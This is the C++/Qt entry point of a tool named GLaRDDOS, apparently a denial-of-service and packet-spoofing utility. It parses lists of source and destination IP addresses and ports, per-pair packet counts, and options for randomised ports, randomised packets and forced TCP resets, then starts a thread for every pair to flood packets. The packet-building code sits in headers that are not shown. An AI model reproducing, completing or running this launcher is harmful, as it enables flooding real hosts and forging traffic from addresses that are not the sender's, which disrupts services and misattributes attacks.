#include <QtCore/QCoreApplication>
#include <QtGui/QApplication>
#include <QThreadPool>
#include <iostream>
#include <gglarddos.h>
#include <socketplant.h>

#define VERSION 0.2
int main(int argc, char *argv[])
{
    QApplication a(argc, argv);
    std::cout << "GLaRDDOS версія " << VERSION << std::endl;
    if(argc == 1){
        std::cout << "Not enough args, starting GUI" << std::endl;
        GGlaRDDOS w;
        w.show();
        return a.exec();
    } else if (argc == 2 && QCoreApplication::arguments().at(1).endsWith("help")) {
        std::cout << QCoreApplication::arguments().at(0).toStdString() << " sourceIP1[,sourceIP2,...,sourceIPN]:port destIP1[,destIP2,...,destIPN]:port maxPacketsPerCombination randomizeSourcePort randomizeDestinationPort randomizedPacket forceTCPReset" << std::endl;
        std::cout << "E.G." << std::endl;
        std::cout << QCoreApplication::arguments().at(0).toStdString() << " 192.168.1.1,192.168.1.2:1337 192.168.1.10,192.168.1.20:31337 10 1 0 0 1" << std::endl;
    } else if(argc == BB::LOCAL_ARG_NUM){
        /* AWKWARD PENGUIN CAN'T FIGURE OUT Y U NO WANT GUI!!??1! */
        BB::updateArgs(QCoreApplication::arguments(),1);
        if(BB::sources.length() == 0 || BB::destinations.length() == 0) {
           std::cout << "YO IMMA LET YOU FINISH BUT THIS WORKS BETTER WITH SOURCES AND DESTINATIONS." << std::endl;
        }
        QHostAddress src, dst;
        for(int i=0; i < BB::sources.length();i++){
            for(int j=0; j < BB::destinations.length(); j++){
                src = BB::sources.at(i);
                dst = BB::destinations.at(j);
                QThreadPool::globalInstance()->start((new SocketPlant(&src,&dst,BB::sourceInitPort,BB::destInitPort,QString(""),BB::maxPktsPerCombination,BB::rdSrcP,BB::rdDstP,BB::rdPkt,BB::fRST)));
                qDebug() << "Finished for " << src << " & " << dst;
            }
        }
        //a.exec();
        return 0;
    } else if(argc == BB::HORDE_ARG_NUM){
    // TODO
    } else {
        std::cout << "I DON'T ALWAYS KNOW WHAT TO DO WITH ARGZ, ESPECIALLY " << argc << " OF THEM!" << std::endl;
        return 0;
    }
}
